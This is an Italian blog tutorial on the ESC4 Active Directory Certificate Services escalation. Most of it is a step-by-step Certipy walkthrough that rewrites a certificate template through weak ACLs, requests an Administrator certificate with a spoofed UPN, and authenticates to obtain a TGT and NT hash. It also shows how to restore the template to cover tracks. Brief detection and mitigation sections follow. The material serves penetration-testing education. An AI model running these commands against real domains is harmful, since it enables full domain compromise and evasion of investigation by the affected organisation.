---
title: 'ESC4 ADCS Privilege Escalation: Template Hijacking con Certipy'
slug: esc4-adcs
description: 'ESC4 ADCS Privilege Escalation: sfruttare ACL deboli sui certificate template Active Directory per trasformarli in ESC1 e ottenere Domain Admin con Certipy.'
image: /BCO.9ce6ba52-ce57-472f-b167-52ab8931a51e.webp
draft: true
date: 2026-03-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

ESC4 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che consiste nel **modificare direttamente un certificate template in Active Directory**.

I certificate template sono oggetti AD salvati in:

```
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration
```

Se un attaccante ottiene **permessi di scrittura sul template**, può modificarlo e trasformarlo in un template vulnerabile (tipicamente **ESC1**).

***

# Quando esiste ESC4

ESC4 esiste quando un utente ha permessi sul template come:

```
WriteDACL
WriteOwner
WriteProperty
FullControl
```

Questo permette di modificare attributi critici come:

```
msPKI-Certificate-Name-Flag
pKIExtendedKeyUsage
msPKI-Enrollment-Flag
nTSecurityDescriptor
```

***

# Cosa può fare l’attaccante

Con questi permessi può:

```
abilitare Enrollee Supplies Subject
aggiungere Client Authentication EKU
dare enrollment a Domain Users
disabilitare Manager Approval
```

In pratica trasforma il template in **ESC1**.

***

# Identificazione con Certipy

Enumerazione template:

```bash
certipy find -u attacker@corp.local -p 'Passw0rd!'
```

Output tipico:

```
Template Name : SecureFiles

Object Control Permissions
Full Control Principals : Authenticated Users

[!] Vulnerabilities
ESC4 : User has dangerous permissions
```

Indicatori chiave:

```
User ACL Principals
WriteDACL
WriteOwner
FullControl
```

***

# Exploitation ESC4

L’attacco avviene in **tre fasi**.

1️⃣ modificare template
2️⃣ ottenere certificato admin
3️⃣ autenticarsi

***

# Step 1 — modificare il template

Certipy può trasformare automaticamente il template in uno **ESC1 vulnerable**.

```bash
certipy template \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-template SecureFiles \
-write-default-configuration
```

Questo comando modifica il template e:

```
abilita Enrollee Supplies Subject
aggiunge Client Authentication
dà enrollment a Authenticated Users
rimuove manager approval
```

Backup automatico:

```
SecureFiles.json
```

***

# Step 2 — richiedere certificato Administrator

Ora il template è vulnerabile.

```bash
certipy req \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-target CA.CORP.LOCAL \
-ca CORP-CA \
-template SecureFiles \
-upn administrator@corp.local \
-sid S-1-5-21-...-500
```

Output:

```
Successfully requested certificate
Saving certificate to administrator.pfx
```

***

# Step 3 — autenticarsi

```bash
certipy auth \
-pfx administrator.pfx \
-dc-ip 10.0.0.100
```

Output:

```
Got TGT
Got NT hash for administrator
```

Accesso ottenuto:

```
Domain Admin
```

***

# Step 4 — ripristinare template (opzionale)

Per coprire le tracce.

```bash
certipy template \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-template SecureFiles \
-write-configuration SecureFiles.json \
-no-save
```

Il template torna allo stato originale.

***

# Perché ESC4 è potente

Perché permette di **creare nuove vulnerabilità AD CS**.

L’attaccante può trasformare un template sicuro in:

```
ESC1
ESC2
ESC3
```

***

# Limite importante

ESC4 funziona **solo se il template è già pubblicato sulla CA**.

Se non è pubblicato serve:

```
ESC7
```

(per abilitarlo sulla CA).

***

# Detection ESC4

Indicatori principali:

```
WriteDACL
WriteOwner
FullControl
WriteProperty
```

su template.

Audit:

```bash
certipy find
```

oppure con BloodHound.

***

# Mitigation ESC4

### Limitare ACL template

Solo gruppi amministrativi devono avere permessi:

```
Enterprise Admins
PKI Admins
```

***

### Audit periodico template

Controllare ACL su:

```
CN=Certificate Templates
```

***

### Usare tool di auditing

Utili:

```
BloodHound
PingCastle
Certipy
```

***

### Disabilitare template inutilizzati

Molti template legacy non servono.

***

# FAQ — ESC4 ADCS

### Cos'è ESC4?

Un attacco che sfrutta **permessi di scrittura su un certificate template**.

### Cosa permette?

Modificare il template e renderlo vulnerabile.

### ESC4 porta a Domain Admin?

Sì, trasformando il template in **ESC1**.

### ESC4 modifica la CA?

No. Modifica **solo il template in Active Directory**.

***

**Key Takeaway:** se un utente può modificare un certificate template in AD, può trasformarlo in un template vulnerabile e ottenere certificati per qualsiasi utente del dominio.

***

> Guida completa AD CS escalation:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con:
> [https://hackita.it/articoli/esc5-adcs](https://hackita.it/articoli/esc5-adcs) · [https://hackita.it/articoli/esc6-adcs](https://hackita.it/articoli/esc6-adcs)Supporta HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Pentest Active Directory o formazione offensiva:
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
